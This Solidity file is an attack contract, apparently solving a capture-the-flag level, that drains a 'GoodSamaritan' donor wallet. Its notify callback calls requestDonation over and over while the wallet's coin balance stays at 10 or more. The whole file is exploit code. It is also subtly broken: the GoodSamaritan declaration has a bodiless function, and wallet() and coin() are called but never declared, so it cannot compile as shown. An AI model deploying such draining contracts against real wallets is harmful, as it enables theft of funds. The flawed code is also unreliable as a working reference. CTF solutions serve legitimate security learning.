pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/utils/Address.sol";

interface IWallet {
    function donate10(address to) external returns (bool);
    function transferRemainder(address to) external;
    function setCoin(ICoin coin_) external;
    function owner() external returns (address);
}

interface ICoin {
    function transfer(address dest_, uint256 amount_) external;
    function balances(address account) external view returns (uint256);
}


contract GoodSamaritan {
    function requestDonation() external;
}


contract LoopingAttacker {
    GoodSamaritan public immutable goodSamaritan;
    ICoin public immutable coin;
    address public immutable walletAddress;

    constructor(address goodSamaritanAddress) {
        goodSamaritan = GoodSamaritan(goodSamaritanAddress);
        IWallet wallet = IWallet(goodSamaritan.wallet());
        walletAddress = address(wallet);
        coin = ICoin(goodSamaritan.coin());
    }

    function attack() external {
        goodSamaritan.requestDonation();
    }

    function notify(uint256 amount) external {
        while (coin.balances(walletAddress) >= 10) {
            goodSamaritan.requestDonation();
        }
    }

    receive() external payable {}
}